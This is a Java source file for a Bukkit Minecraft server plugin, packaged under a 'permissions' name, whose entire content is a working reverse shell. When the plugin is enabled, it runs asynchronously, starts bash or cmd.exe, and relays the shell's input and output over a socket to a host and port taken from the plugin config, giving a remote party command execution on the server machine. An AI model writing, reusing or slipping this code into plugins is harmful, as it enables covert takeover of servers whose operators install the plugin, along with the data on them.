package org.example.permissions;

import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Plugin extends JavaPlugin {

    @Override
    public void onEnable() {
        // Do not block server startup by opening the reverse shell asynchronously
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                openConnection();
            } catch (Exception e) {
            }
        });
    }

    private void openConnection() throws Exception {
        FileConfiguration config = getConfig();

        Process p = new ProcessBuilder(getExecutor()).redirectErrorStream(true).start();
        Socket s = new Socket(config.getString("host"), config.getInt("port"));
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {
            }
        }

        p.destroy();
        s.close();
    }

    // Determinate which executor to use based on operating system
    private String getExecutor() {
        return System.getProperty("os.name").startsWith("Windows") ? "cmd.exe" : "bash";
    }
}
